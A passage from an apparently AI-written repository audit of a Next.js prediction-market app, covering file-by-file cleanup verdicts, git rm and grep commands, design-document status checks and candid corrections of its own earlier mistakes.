- [ ] M3 — indexes applied; `EXPLAIN ANALYZE` confirms index scans

## Brand identity — **blocking**
- [ ] **C11** — `grep -rlE '<text|r="44\.6"' public/brand public/icons` → **0 hits**
- [ ] **C11** — PWA install icon matches the in-app mark
- [ ] **C11** — email header image matches the in-app mark
- [ ] **C11** — `og-1200x630.png` + `twitter-1200x600.png` visually verified
- [ ] **C11** — `build-logo-png.mjs` generates from `brand.tsx` (single source)

## Repo integrity — **blocking**
- [ ] **C10** — `db-check.cjs` deleted; no raw-PII selects outside the masking layer
- [ ] §18 — false kit deleted; `grep -rE 'oklch\([^)]*\b21[0-9]\)' .` → **0 hits**
- [ ] §18 — `grep -rn 'data-theme="light"' .` → **0 hits**
- [ ] §18 — 4 dead components deleted; `tsc --noEmit` clean

## Documentation integrity — **blocking**
- [ ] **C9** — `CLAUDE.md:39` + `:278` no longer mandate the teal kit
- [ ] **C9** — `docs/DESIGN_AUTHORITY.md` exists; B1–B4 recorded
- [ ] **C9** — teal kit + `kit-gap-audit.md` carry SUPERSEDED headers
- [ ] **C9** — grep clean: no doc instructs building from `50PICK/` or `Final UI enhancement Kit/`
- [ ] §16 — every design doc carries a `STATUS:` header
- [ ] `CLAUDE.md` matches the build (single theme, EN/SW/ZH, no FR)
- [ ] Every `docs/` compliance file verified-against-code or marked historical
- [ ] M11 — `next-themes` removed
- [ ] M12 — `tsconfig` scoped to `src/`+`scripts/`; stale excludes gone
- [ ] §15 — 4 dead components deleted; 2 zips deleted; design material moved out

---

---

---

# 15. Repo cleanup — FIX the truth, DELETE the noise

**One test, applied to every non-code file:**

> **Does this describe what SHOULD be true, or what WAS true?**
> **SHOULD** → it is authority. **Guide the fix.** Never delete.
> **WAS** → it is noise. **Guide the delete.** It can only mislead.

Every verdict below carries a reference count or a merge check. **Nothing is deleted on a guess** — because guessing is exactly how I got H3 wrong (§11.0).

## 15.0 Read this first — the H3 lesson

My orphan detector flagged `src/proxy.ts` as *"never imported — delete candidate."* It is **your entire security-header layer**. Next.js loads it by *filename convention*, not by import.

> **Zero imports + convention filename = LOAD-BEARING.**
> **Zero imports + arbitrary name = candidate.**

`proxy.ts` · `instrumentation.ts` · every `page.tsx`/`layout.tsx`/`route.ts` · `sw.js` · `manifest.json` — **all have zero imports by design.**

---

## 15.1 FIX — these are the truth (never delete)

| File | Status | What to do |
|---|---|---|
| **`src/app/globals.css`** | ✅ **AUTHORITY** — the implementation. Newest artifact. | **Fix:** H10 contrast tokens (`btn-no` → `oklch(58% 0.20 22)`, `btn-danger` → `oklch(58% 0.22 25)`, add `--border-control`). L5: rename `--teal-*` → `--royal-*`. |
| **`docs/design-master-brief.md`** | ✅ **AUTHORITY** — palette matches live to **0.3%**; the 07-07 spec names it source of truth. | **Fix:** promote it in `CLAUDE.md` (C9). Add a `STATUS: authoritative` header. |
| **`prisma/schema.prisma`** | ✅ **AUTHORITY** — the data contract. | **Fix:** M3 indexes; C6 `@@unique([prevHash])`; C1 `taxableWinningsTzs`; M8 comment. |
| **`CLAUDE.md`** | ⚠️ **MUST BECOME TRUE** — first file everyone reads. Currently **mandates the teal kit (C9)**. | **Fix, do not delete.** Rewrite `:39` + `:278`; correct light/dark, FR, next-themes. **15 minutes — highest risk-removed-per-minute in this report.** |
| **`docs/DESIGN_AUTHORITY.md`** | ❌ **DOES NOT EXIST** — cited **3×** in code as the authority for invariant B3. | **Write it.** B1 palette royal 268 · B2 YES/NO untouchable · B3 single dark theme · B4 claret/aqua rules. |
| `docs/DATA-LAYER.md`, `docs/FLOWS.md` | ✅ Matched code where I checked | **Keep.** Add `STATUS: verified 2026-07-15`. |
| `src/lib/i18n-dict.ts` | ✅ **AUTHORITY** for all copy — 1,286 keys, near-perfect parity | **Fix:** C8 tax copy; H11 `skipToContent`; H12 tax/net strings. |
| `.env.example`, `RAILWAY.md` | ⚠️ Wrong secret names (**H7**) | **Fix:** `SELCOM_/AZAMPAY_/MIXX_WEBHOOK_SECRET`. |
| `tsconfig.json` | ⚠️ Sweeps design mocks; stale excludes (**M12**) | **Fix:** scope `include` to `src/`+`scripts/`. |

---

## 15.2 DELETE — dead code (0 imports, non-convention names)

| File | Lines | Evidence |
|---|---|---|
| `src/components/ui/card.tsx` | 45 | `from "@/components/ui/card"` → **0**. Superseded by the `.card` CSS class. |
| `src/components/ui/skeleton.tsx` | 45 | → **0**. Superseded by `.skeleton` / `.kp-shimmer-track`. |
| `src/components/badges/AchievementToast.tsx` | 65 | → **0**. Also the only `PascalCase.tsx` in a kebab-case codebase — the naming smell predicted it. |
| `src/components/markets/market-stats.tsx` | 60 | → **0**. |

**215 lines out of 87,729 — 0.25% dead code.** Most codebases this size carry 5–15%. **Your code is exceptionally clean.**

```bash
git rm src/components/ui/card.tsx src/components/ui/skeleton.tsx        src/components/badges/AchievementToast.tsx        src/components/markets/market-stats.tsx
npm run typecheck   # must stay clean
```

- [ ] 4 files deleted · [ ] `tsc --noEmit` clean · [ ] 57 suites green

---

## 15.3 DELETE — the teal kit (**C9: it mandates a regression**)

**This is not housekeeping. It is the C9 remediation.** While these exist and `CLAUDE.md` points at them, an engineer following your documented process reverts the brand to teal and resurrects the killed light theme.

| Path | Files | Evidence it is noise |
|---|---|---|
| `50PICK/design_handoff_prediction_market_kit/kit/tokens.css` | 1 | **teal 215** vs live royal 268 · ships dead `[data-theme="light"]` |
| `50PICK/design_handoff_prediction_market_kit/kit/*.jsx` | 14 | teal-era specimens; **0 build refs** |
| `50PICK/design_handoff_prediction_market_kit/Design Kit.html` | 1 | rendered teal specimen |
| `50PICK/design_handoff_prediction_market_kit/README.md` | 1 | describes the teal kit as deliverable |
| `50PICK/design_handoff_prediction_market_kit/screenshots/` | 1 | teal-era screenshot |
| `50PICK/New Designs/theme/globals.css` | 1 | **self-labelled "chat imports removed for mock"**; live is *ahead* of it |
| `50PICK/New Designs/handoff/*.tsx` | 3 | design mocks — **typechecked by `tsconfig` (M12)** |
| `50PICK/New Designs/handoff/README-handoff.md` | 1 | describes the mocks |
| `docs/kit-gap-audit.md` | 1 | rule *"build only from the kit; never invent"* → **mandates the teal kit** |

**If you want the palette history, keep `design-master-brief.md` — it has the same information and it is *correct*.**

```bash
git rm -r "50PICK/"
git rm docs/kit-gap-audit.md
```

- [ ] `50PICK/` removed · [ ] `kit-gap-audit.md` removed · [ ] `CLAUDE.md:39` + `:278` rewritten (**C9**) · [ ] grep clean: no doc names the teal kit

---

## 15.4 DELETE — already-delivered or rejected kit content

Each verified against the build:

| Path | Files | Evidence |
|---|---|---|
| `.../code/glyphs-additions.tsx` | 1 | **All 12 glyphs merged** into live `glyphs.tsx` (344 lines). Duplicate — and typechecked (M12). |
| `.../code/state-tokens.css` | 1 | **0 of 5 tokens present in live.** Live has its own 19 state rules. **Rejected approach**, not pending work. |
| `.../code/micro-patterns.css` | 1 | `--ease-micro`/`--ease-stage` **merged**; `--ease-enter` absent. Partially adopted → **the live file is the record**. |
| `.../svg/badges/*.svg` + `badges-gilt/*.svg` | 24 | **Badges are inline React** (`Badge.tsx` → `BADGE_ICONS`, styled by `.badge--*` in globals.css). SVGs unreferenced. |
| `.../og/og-1200x630.svg`, `twitter-1200x600.svg` | 2 | **PNGs already shipped** — `public/og/*.png`, referenced `layout.tsx:67,73`. These are the sources. |
| `.../public/pay/bank.svg`, `card.svg` | 2 | **Live uses in-house glyphs** (`cardPay`/`bank` via `PaymentLogo`). Redundant. |
| `.../specimens/*.html` | 5 | Design specimens; **0 build refs** |
| `.../reference/*` | 2 | Reference build; **0 build refs** |
| `.../comms/*.html`, `sms-templates.md` | 3 | **Live templates are in `email.ts` (1,083 lines)** — that is the truth |
| `.../spec/50pick-refinement-spec.md` | 1 | **Completed worklist**: all 12 glyphs ✅, hero replaced ✅, **20 orphan slides already deleted** ✅, A1 sparkline ✅ |
| `.../QA-REPORT.md`, `README.md` | 2 | QA of the kit, not the product |
| `50pick-design-final.zip` | 1 | **Duplicate of the extracted folder beside it** |
| `files(2).zip` | 1 | Browser download name — unknown provenance |
| `preview-*.png` | 2 | Reference boards |

```bash
git rm -r "Final UI enhancement Kit/"
echo "*.zip" >> .gitignore
```

**Keep externally:** the badge/glyph SVGs and OG SVGs are *design sources*. Archive them in Drive/Figma — they are not build inputs, and git cannot diff them usefully.

- [ ] `Final UI enhancement Kit/` removed · [ ] sources archived externally · [ ] `*.zip` gitignored

---

## 15.5 MOVE OUT — real value, wrong home (0 build refs, verified)

| Path | Size | Why it leaves |
|---|---|---|
| `Email Signatures/` | 0.46 MB | Marketing collateral. Not product. |
| `Translations/*.xlsx` | 0.13 MB | **`i18n-dict.ts` is the source of truth** (1,286 keys). A workbook that drifts from it is a liability. |
| `Final logo design/` | 4 KB | Brand masters. Used marks already in `public/brand/`. |
| `Tester Recommendations/*.docx` | 0.18 MB | Git cannot diff `.docx`. Extract findings → tickets. |
| `assets/glyphs/` | 0.03 MB | Glyph sources — already built into `glyphs.tsx`. |
| `docs/*.pdf` (4), `brief-*.html`, `manual-*.html` | ~3 MB | Generated binaries. Regenerate from source; host in Drive. |

- [ ] Moved to Drive/Figma · [ ] `DESIGN_AUTHORITY.md` records where each lives

---

## 15.6 DO NOT DELETE — looks dead, is load-bearing

**This list exists because I got H3 wrong.**

| File | Looks dead | Why it stays |
|---|---|---|
| **`src/proxy.ts`** | 0 imports | **Your entire security-header layer** — CSP, HSTS, frame-busting, auth gate. Next 16 convention. **Deleting it silently removes every security header.** |
| `src/instrumentation.ts` | 0 imports | Next convention. `onRequestError` → server stacks on Railway; **starts the lifecycle ticker**. |
| `src/lib/server/lifecycle.ts` | 0 *static* imports | **Dynamically** imported at `instrumentation.ts:34`. Static analysis cannot see `await import()`. |
| **`src/components/wallet/payment-logo.tsx`** | `MNO_LOGOS` all `null` | **Not dead — waiting.** M-Pesa/Airtel/HaloPesa/Mixx marks are **trademarked**; Ali sources them into `public/pay/`. The `null` + placeholder is deliberate so layout ships now. **Undelivered work, not noise.** |
| `public/icons/favicon-*.png`, `mark-*-512.png`, `tile-512.png` | 0 code refs | `manifest.json` / browser convention. **51 KB — not worth the risk.** |
| `scripts/*.test.mts` (57) | not imported by `src/` | **Your test suite.** Run them in CI (**H9**). |
| `scripts/mobile-audit/` (5.9 MB) | large binary dir | **Already gitignored.** Local only. **No action.** |
| `docs/design-master-brief.md` | looks like "another design doc" | **It is the design authority.** §15.1. |

---

## 15.7 Summary

| Verb | Items | Effect |
|---|---|---|
| **FIX** | 9 files | `CLAUDE.md` (C9) · `globals.css` (H10) · `schema.prisma` (M3/C6/C1) · write `DESIGN_AUTHORITY.md` · `i18n-dict.ts` (C8/H11/H12) · `.env.example` (H7) · `tsconfig` (M12) |
| **DELETE — dead code** | 4 files | 215 lines |
| **DELETE — teal kit (C9)** | 24 files | removes the regression mandate |
| **DELETE — delivered/rejected kit** | 47 files | ~2.4 MB |
| **MOVE OUT** | ~15 files | ~3.7 MB |
| **DO NOT TOUCH** | 8 entries | incl. `proxy.ts` — the file I nearly told you to delete |

**Total: ~6.1 MB and 215 lines removed. 47+24 files deleted. 9 files fixed.**

### The honest headline

**Your code is clean — 0.25% dead.** The clutter is entirely non-code, and its cost was never disk space:

- `CLAUDE.md`'s pointer to the teal kit **made v2 of this audit benchmark against the wrong file** (§11.0)
- It would make your next engineer **revert the brand** (**C9**)
- `proxy.ts` looked deletable and is **your whole security layer** (§11.0)

**The damage is not bytes. It is that nobody — not a new engineer, not a regulator, not an auditor with a full extract — can tell which file is true.** Deleting the noise isn't tidying. It is removing the thing that makes the truth unfindable.


# 16. Design requirements audit — every doc tested against the build

**Method:** 35 design documents found. Each tested by checking whether its *requirements exist in the compiled product* — not by reading its claims. Verdicts:

- **BUILT** — requirements are in the product. The doc is a completed worklist, not outstanding work.
- **CONTRADICTS** — the doc mandates something the build correctly does not do. **Actively harmful.**
- **HISTORICAL** — accurate for its date; superseded.
- **KEEP** — current and matches the build.

## 16.1 CONTRADICTS — delete or header immediately

| Doc | Mandate | Reality | Verdict |
|---|---|---|---|
| **`CLAUDE.md:39`** | *"Design kit … read before any color / composition / hero change"* → teal kit | Brand is royal 268 | **C9 — rewrite** |
| **`CLAUDE.md:278`** | *"read the kit first… trust the kit, not the name"* | The `--hero-grad-warm` bug it cites is **already fixed** (`globals.css:329` is a royal radial) | **C9 — rewrite** |
| **`docs/kit-gap-audit.md`** (2026-07-04) | *"build only from the kit; never invent; when the kit is silent, stop"* → teal kit + light theme | Build follows `design-master-brief.md` | **HISTORICAL header + retire the rule** |
| **`50PICK/design_handoff_.../kit/tokens.css`** | teal 215 · full `[data-theme="light"]` | royal 268 · no light theme | **SUPERSEDED header** |
| **`50PICK/design_handoff_.../README.md`** | describes the teal kit as deliverable | superseded | **SUPERSEDED header** |
| **`50PICK/design_handoff_.../Design Kit.html`** | rendered teal specimen | superseded | **Move out (§15.3)** |

**These six are the finding.** Everything else below is housekeeping.

## 16.2 BUILT — completed worklists masquerading as requirements

### `Final UI enhancement Kit/.../50pick-refinement-spec.md` (2026-07-07)

Reads as a live requirements doc. **Verified: its items are done.**

| Spec item | Requirement | Verified |
|---|---|---|
| **#9** | *"Add 12 Controlled-Poll glyphs: calendarClock, hourglassHalf, hourglassOff, target, sliders, calendarRange, gauge, shuffle, circleStop, timerReset, listFilter, stepForward"* | ✅ **all 12 in `src/components/ui/glyphs.tsx`** |
| **#10** | *"Hero image — REPLACE. Produce `public/hero/hero-bg.webp` 2400×1600"* | ✅ `hero-bg.webp` exists (193 KB, VP8X) |
| **#10** | *"Delete the 20 orphan slides and the two orphan hero components"* | ✅ **0 slides remain**; `page-hero.tsx` is live and used |
| **A1** | *"MarketCard v2 sparkline + trader-crest upgrade"* | ✅ `mcardp-spark` in `globals.css:1706` |

**Verdict: BUILT.** Mark `STATUS: completed 2026-07-13`, or delete. Leaving it undated invites someone to "implement" work that's already shipped — the same trap as C9, one degree milder.

| Doc | Status |
|---|---|
| `Final UI enhancement Kit/.../code/glyphs-additions.tsx` (105 lines) | **DUPLICATE** — merged into live `glyphs.tsx` (344 lines). **Delete** (also **M12**: it's typechecked). |
| `docs/visual-assets-brief.md` | Specs `hero-bg-01…06` rotating set — **only `hero-bg.webp` exists**. Optional per spec; **not** a defect. Mark the rotating set as **not adopted** so nobody builds it. |
| `docs/glyph-reference-for-design.md` | Specs the 12 glyphs — **all built**. **HISTORICAL**. |
| `Final UI enhancement Kit/.../QA-REPORT.md` | QA of the kit, not the product. **Move out.** |

## 16.3 UNDATED + UNVERIFIED — date or delete

Undated docs claiming completion states are the H13/C9 trap in miniature. Someone will read them as current.

| Doc | Risk |
|---|---|
| `docs/consistency-audit.md` *(dated 07-04)* | Claims consistency verified — against the **teal kit** era. Findings may be inverted now. |
| `docs/responsiveness-audit.md` | Undated. Claims responsive verified. **I could not verify** (no browser). |
| `docs/navigation-ia-review.md` | Undated. Referenced by live code (`withdraw/page.tsx:99` cites *"IA review R6"*) — so **some of it shipped**. Which parts? Unknown. |
| `docs/status-lexicon-inventory.md` | Undated. Lexicon **is** centralised (`admin-status-lexicon.ts`) → likely BUILT. |
| `docs/perfection-plan.md` | Undated. Aspirational. |
| `docs/proposals.md`, `docs/feature-backlog.md` | Undated wishlists. Fine — **label them wishlists**. |
| `docs/ui-rollout-tracker.md` *(07-13)* | Newest. Cites `DESIGN_AUTHORITY B3` — **a doc that doesn't exist**. |

**`navigation-ia-review.md` deserves attention:** live code cites *"IA review R6"* as authority for a redirect. If R6 shipped and R1–R5 didn't, nobody can tell which rules are live. Same shape as C9 — **prose as authority, unbound to code**.

## 16.4 KEEP — verified accurate

| Doc | Why |
|---|---|
| **`docs/design-master-brief.md`** | ✅ **The real design source of truth.** Palette matches live to **~0.3%**. Cited as source by the 07-07 spec. → promote to authority in `CLAUDE.md` (**C9**). |
| `Final UI enhancement Kit/.../50pick-micro-interactions-spec.md` | Motion spec. Live has `prefers-reduced-motion` on every keyframe + device throttle → **likely built**. Verify, then mark. |
| `Final UI enhancement Kit/.../50pick-admin-reporting-spec.md` | Admin reporting. `reports/catalogue.ts` exists. Verify. |
| `assets/glyphs/*` | Source for built glyphs. **Move out** (§15.3), keep externally. |

## 16.5 The pattern

**Every design doc in this repo is one of three things, and none is labelled:**

1. **A completed worklist** (`refinement-spec`, `glyph-reference`) — read as a requirement, it produces duplicate work.
2. **A superseded snapshot** (`kit/tokens.css`, `kit-gap-audit`) — read as a requirement, **it produces a regression (C9)**.
3. **The actual authority** (`design-master-brief.md`) — **not named as such by `CLAUDE.md`**, which names #2 instead.

**The fix is one line per file: a `STATUS:` header.**

```
STATUS: completed 2026-07-13 — all items shipped. Historical.
STATUS: superseded 2026-07-07 by docs/design-master-brief.md. Do not build from this.
STATUS: authoritative — palette + composition. See docs/DESIGN_AUTHORITY.md for invariants.
```

Without it, a doc's age is invisible and its authority is assumed. **That is exactly how v2 of this audit benchmarked against the wrong kit — and how your next engineer reverts the brand.**

## 16.6 Action summary

| Action | Files |
|---|---|
| **Rewrite (C9)** | `CLAUDE.md:39`, `CLAUDE.md:278` |
| **Write** | `docs/DESIGN_AUTHORITY.md` (cited 3× in code; does not exist) |
| **SUPERSEDED header** | `kit/tokens.css`, `kit/README.md`, `kit-gap-audit.md` |
| **STATUS: completed** | `refinement-spec.md`, `glyph-reference-for-design.md` |
| **Delete** | `glyphs-additions.tsx` (merged duplicate) |
| **Date or delete** | `consistency-audit`, `responsiveness-audit`, `navigation-ia-review`, `status-lexicon-inventory`, `perfection-plan` |
| **Label wishlist** | `proposals.md`, `feature-backlog.md` |
| **Promote to authority** | `design-master-brief.md` |
| **Delete (§15.3/15.4)** | teal kit, `kit-gap-audit.md`, `Final UI enhancement Kit/`, `glyphs-additions.tsx` |
| **Move out (§15.5)** | `assets/glyphs/`, signatures, translations, PDFs |

- [ ] C9 rewrites done · [ ] `DESIGN_AUTHORITY.md` written · [ ] every design doc carries a `STATUS:` header · [ ] `glyphs-additions.tsx` deleted · [ ] no doc mandates the teal kit


---

# 18. THE DEFINITIVE FILE VERDICT

**Every one of 1,105 files classified by evidence.** Method:
- **Import graph** resolved across all 548 `.ts/.tsx`, walked from **203 framework entry points** (`page`/`layout`/`route`/`proxy`/`instrumentation`/…), following `@/` aliases, relative paths, index resolution, **and dynamic `import()`**.
- **Assets** cross-checked against `manifest.json` **and** `layout.tsx` metadata — not just source greps.
- **Theme truth** = `src/app/globals.css` (royal 268, dark-only), per operator ruling.
- **Every candidate re-read before judgment.** Two false positives were caught this way (see §18.6).

## 18.1 DELETE — false (contradicts the one true theme)

```bash
git rm -r "50PICK/design_handoff_prediction_market_kit/"
```

| Evidence | Value |
|---|---|
| teal-215 occurrences | **24** |
| light-theme blocks | **3** |
| **royal-268 occurrences** | **0** |
| `src/` imports | **0** |
| Build references | **0** |

**15 files · ~120 KB.** Not partly stale — **zero royal-268 anywhere in it**. Nothing to salvage. History stays in git.

- [ ] Deleted · [ ] `tsc --noEmit` clean · [ ] build green

## 18.2 DELETE — dead code (import-graph unreachable)

| File | Lines | Evidence |
|---|---|---|
| `src/components/ui/card.tsx` | 45 | unreachable · 0 mentions repo-wide · superseded by `.card` CSS |
| `src/components/ui/skeleton.tsx` | 45 | unreachable · 0 mentions · superseded by `.skeleton` |
| `src/components/badges/AchievementToast.tsx` | 65 | unreachable · 0 mentions · only `PascalCase.tsx` in a kebab-case codebase |
| `src/components/markets/market-stats.tsx` | 60 | unreachable · 0 mentions |

> **544 of 548 files reachable. 215 dead lines out of 87,729 = 0.25%.**
> Most codebases this size carry 5–15%. **This is an exceptional result** and worth saying plainly.

- [ ] 4 files deleted · [ ] `tsc --noEmit` clean · [ ] 57 suites green

## 18.3 DELETE — security (**C10**)

| File | Why |
|---|---|
| `db-check.cjs` | Dumps **raw NIDA + full legal name + email + phone**. Committed. 0 references. No auth. **No audit entry.** |

- [ ] `git rm db-check.cjs` · [ ] `.gitignore` blocks scratch scripts · [ ] history + logs checked

## 18.4 DELETE — duplicates

| File | Evidence |
|---|---|
| `Final UI enhancement Kit/.../code/micro-patterns.css` | **byte-identical** to shipped `src/app/micro-patterns.css` |
| `Final UI enhancement Kit/.../code/glyphs-additions.tsx` | all 12 glyphs merged into `src/components/ui/glyphs.tsx`; also typechecked (**M12**) |
| `Final UI enhancement Kit/50pick-design-final.zip` | duplicate of the extracted folder beside it |
| `Final UI enhancement Kit/files(2).zip` | unnamed archive, unknown provenance |
| `docs/SESSION_STATUS.md`, `docs/next-session-prompt.md`, `docs/ui-rollout-tracker.md` | session scratch |

## 18.5 REGENERATE (not delete) — brand assets are the OLD logo · **corrected in v8**

> **v7 said: "unused, 51 KB, low value, delete."** That was wrong on the most important ones.
> **All four `public/brand/*.svg` are the OLD round-1 logo (ring + "50" numerals).** Three feed
> shipped PNGs. They are not dead weight — they are **wrong**, and they are **in production**. → **C11**

| Asset | v7 said | v8 verdict |
|---|---|---|
| `public/brand/mark-color.svg` | *(listed as USED)* | ❌ **OLD logo** → **regenerate** (ships as the PWA icon + every email) |
| `public/brand/mark-white.svg` | delete, 1.0 KB | ❌ **OLD logo** → **regenerate** (white single-ink variant is needed) |
| `public/brand/mark-dark.svg` | delete, 1.0 KB | ❌ **OLD logo** → **regenerate** (dark single-ink for print) |
| `public/brand/mark-simplified.svg` | delete, 0.6 KB | ❌ **OLD logo** → **regenerate** from `mark-a-simplified.svg` (required ≤20px) |
| `public/icons/mark-color-512.png` | *(listed as USED)* | ❌ **OLD** — **verified visually** → rebuild |
| `public/icons/maskable-512.png` | *(listed as USED)* | ❌ **OLD** → rebuild |
| `public/icons/mark-white-512.png` | delete, 15.3 KB | ❌ **OLD** → rebuild |
| `public/icons/mark-dark-512.png` | delete, 15.3 KB | ❌ **OLD** → rebuild |
| `public/icons/tile-512.png` | delete, 17.2 KB | ❌ **OLD** → rebuild |
| `public/icons/icon-192.png` | *(USED)* | ⚠️ verify → likely rebuild |
| `public/icons/apple-touch-180.png` | *(USED)* | ⚠️ verify → likely rebuild |

**Genuinely dead — still delete:**

| Asset | Size | Evidence |
|---|---|---|
| `public/icons/favicon-16.png` | 0.5 KB | metadata declares `favicon.svg` + `favicon.ico` **only** |
| `public/icons/favicon-32.png` | 0.8 KB | same |

**KEEP — verified new + declared:** `favicon.svg` (**NEW mark — correct**), `favicon.ico`, 3 shortcut icons, `mark-color.svg`→*after regeneration*, `og-1200x630.png`, `twitter-1200x600.png` *(⚠️ visually verify for the old mark)*, `hero-bg.webp`, `markets-narrow.png`, `sw.js`, `manifest.json`.

**Why v7 was wrong:** I checked *reachability* (is it referenced?) and never checked *correctness* (is it the right logo?). An asset can be perfectly wired and completely wrong. **Same error class as `proxy.ts` — I asked the wrong question of the file.**

## 18.6 Two false positives — caught by re-reading

**Recording these because §11.0 (the `proxy.ts` retraction) proves I get this wrong when I don't.**

| Candidate | Looked | Actually |
|---|---|---|
| `public/brand/mark-white.svg` | "referenced by `build-logo-png.mjs`" → KEEP | **The grep matched `mark-white` inside `fiftymark-white`.** The script generates its SVG **inline** and outputs `fiftymark-*.png`. It never reads the file. → **DELETE** |
| `Final UI enhancement Kit/` | "false kit like `50PICK/`" (my v5/v6 claim) | **Wrong. Its code SHIPPED.** `layout.tsx:9-10` imports `state-tokens.css` + `micro-patterns.css`. It is grounded in `design-master-brief.md`, contains **zero** teal-215. → **NOT false. Move out, don't delete.** |
| `public/brand/*.svg` | "unused → delete, 51 KB, low value" (my v7 claim) | **Wrong, and backwards.** They are the **OLD logo**, and three of them feed **shipped** PNGs — the PWA icon and every email. They must be **regenerated**, not deleted. I checked *reachability* and never checked *correctness*. → **C11** |

**Substring matches are not references.** Both directions of that error are in this report.

## 18.7 REWRITE — mandate the false kit (**C9**)

| File | Line | Instruction |
|---|---|---|
| `CLAUDE.md` | 39 | *"Design kit … read before any color / composition / hero change"* |
| `CLAUDE.md` | 278 | *"read the kit first … trust the kit, not the name"* |
| `README.md` | 67 | *"**Locked** design kit — read before any color, gradient, or composition change"* |
| `docs/kit-gap-audit.md` | — | *"build only from the kit; never invent"* |

## 18.8 FIX — 10 code comments citing the deleted kit

`globals.css:3`, `globals.css:457`, `conviction-dial.tsx:4`, `pnl-chart.tsx:4`, +6. Comments, **not imports** — no build impact, but they point at a file that will no longer exist.

**`pnl-chart.tsx:4` is the proof your team already knew:** *"(kit-specimens/microstructure.jsx) **re-tokenised for the royal canvas**"* — someone hit the kit's teal, recognised it was wrong, fixed it, and wrote it down. **The knowledge existed in a comment and never reached `CLAUDE.md`.**

## 18.9 MOVE OUT — real material, not build input

**Not deletion — relocation to Drive/Figma.** All verified **0 build references**.

| Directory | Size | Files | What it is |
|---|---|---|---|
| `Final UI enhancement Kit/` | 2.44 MB | 177 | **Real, and it shipped** (§18.6). Keep externally as the design record. |
| `Email Signatures/` | 0.46 MB | 3 | Marketing collateral |
| `50PICK/` *(remainder after §18.1)* | ~0.27 MB | 8 | `New Designs/` mocks — live is ahead of them |
| `Tester Recommendations/` | 0.18 MB | 1 | `.docx` — git can't diff it |
| `Translations/` | 0.13 MB | 2 | `.xlsx` — **source of truth is `i18n-dict.ts`** |
| `Final logo design/` | 4 KB | 6 | Brand masters — used ones already in `public/brand/` |
| `assets/glyphs/` | 32 KB | 2 | Source for glyphs already inlined |
| `docs/*.pdf`, `docs/*.html` | ~3 MB | ~12 | Generated binaries |

## 18.10 KEEP — load-bearing despite 0 imports

**This list exists because I wrongly called `src/proxy.ts` dead (§11.0).**

| File | Why 0 imports | Deleting it would |
|---|---|---|
| **`src/proxy.ts`** | Next 16 file convention | **remove EVERY security header** (CSP, HSTS, frame-busting) |
| `src/instrumentation.ts` | Next convention | kill server error reporting + lifecycle boot |
| `src/lib/server/lifecycle.ts` | **dynamic** `await import()` at `instrumentation.ts:34` | stop the market lifecycle ticker |
| 203 `page/layout/route/loading/error/not-found` | Next convention | delete the app |
| `scripts/*.test.mts` (57) | not imported by `src/` | **delete your test suite** |
| `docs/design-master-brief.md` | prose | **remove the real design authority** (0.3% match to live) |
| `public/sw.js`, `manifest.json`, `favicon.*` | browser convention | break the PWA |

**Rule: 0 imports + convention filename = load-bearing. 0 imports + arbitrary name = candidate.**

## 18.11 KEEP — verified current

| Artifact | Evidence |
|---|---|
| `src/app/globals.css` | **THE TRUTH.** Royal 268, dark-only, `color-scheme: dark`. |
| `src/app/state-tokens.css` | Shipped (`layout.tsx:9`). **51 lines ahead of the kit copy** — podium crown, admin bars, live carousel. |
| `src/app/micro-patterns.css` | Shipped (`layout.tsx:10`). |
| `docs/design-master-brief.md` | Real design authority. → promote in `CLAUDE.md` (**C9**). |
| `src/lib/i18n-dict.ts` | 1,286 keys, EN/SW/ZH near-parity. Source of truth for copy. |
| `prisma/` (37 migrations + schema) | Complete history. |
| `scripts/` (57 suites + tooling) | Run them in CI (**H9**). |
| `public/` (16 declared assets) | manifest/metadata verified. |

## 18.12 The complete tally

| Verdict | Items | Size |
|---|---|---|
| **DELETE — false kit** | 15 files | ~120 KB |
| **DELETE — dead code** | 4 files | 215 lines |
| **DELETE — security (C10)** | 1 file | 19 lines |
| **DELETE — duplicates** | 7 files | ~1.2 MB |
| **DELETE — dead assets** | 8 files | 51 KB |
| **REWRITE** | 4 docs | — |
| **FIX comments** | 10 sites | — |
| **MOVE OUT** | ~200 files | ~6.5 MB |
| **KEEP** | ~860 files | — |
| **TOTAL removed from the repo** | **35 deleted + ~200 moved** | **~7.9 MB** |

## 18.13 The one-command version

```bash
# 1. The false kit — zero royal-268, zero imports, zero build refs
git rm -r "50PICK/design_handoff_prediction_market_kit/"

# 2. PII scratch script (C10) — raw NIDA, no auth, no audit
git rm db-check.cjs

# 3. Dead code — import-graph unreachable from 203 entry points
git rm src/components/ui/card.tsx \
       src/components/ui/skeleton.tsx \
       src/components/badges/AchievementToast.tsx \
       src/components/markets/market-stats.tsx

# 4. Duplicates
git rm "Final UI enhancement Kit/50pick-design-final.zip" \
       "Final UI enhancement Kit/files(2).zip" \
       "Final UI enhancement Kit/50pick-design-final/code/micro-patterns.css" \
       "Final UI enhancement Kit/50pick-design-final/code/glyphs-additions.tsx"

# 5. Dead assets — ONLY these two. (v7 listed more; v8 corrects that —
#    the brand assets are the OLD logo and must be REGENERATED, not deleted. See C11.)
git rm public/icons/favicon-16.png public/icons/favicon-32.png

# 5b. C11 — brand identity. REGENERATE, do not delete:
cp "Final logo design/mark-a.svg"            public/brand/mark-color.svg
cp "Final logo design/mark-a-simplified.svg" public/brand/mark-simplified.svg
#    then rebuild mark-white.svg / mark-dark.svg from brand.tsx's single-ink recipe,
#    and rebuild ALL derived PNGs (mark-color-512, maskable-512, tile-512,
#    icon-192, apple-touch-180, mark-white-512, mark-dark-512).
grep -rlE '<text|r="44\.6"' public/brand public/icons   # must return 0 hits

# 6. Session scratch
git rm docs/SESSION_STATUS.md docs/next-session-prompt.md docs/ui-rollout-tracker.md

# 7. Verify
npx tsc --noEmit && npm run build
```

**Then — the part that actually matters:** rewrite `CLAUDE.md:39`, `CLAUDE.md:278`, `README.md:67`, and write `docs/DESIGN_AUTHORITY.md`. **Deleting the kit removes the trap; the docs are what walked people into it.**


# Final assessment

The engineering instincts are strong. **The design instincts are stronger.** Token fidelity to within 0.3%, 1,286 i18n keys at near-perfect parity, a CJK fallback chosen specifically to protect Tanzanian mobile data, reduced-motion on every keyframe plus a device-tier throttle, and a bet confirmation that warns you when your payout is thin. That is not a team cutting corners.

Which is exactly why the findings land as hard as they do.

Eight patterns must break before launch:

1. **Built and tested single-instance while planned multi-instance.** The in-memory `withLock` fallback blinds the suite to C6, H2, M1, and part of C4. **One CI change surfaces all four.**

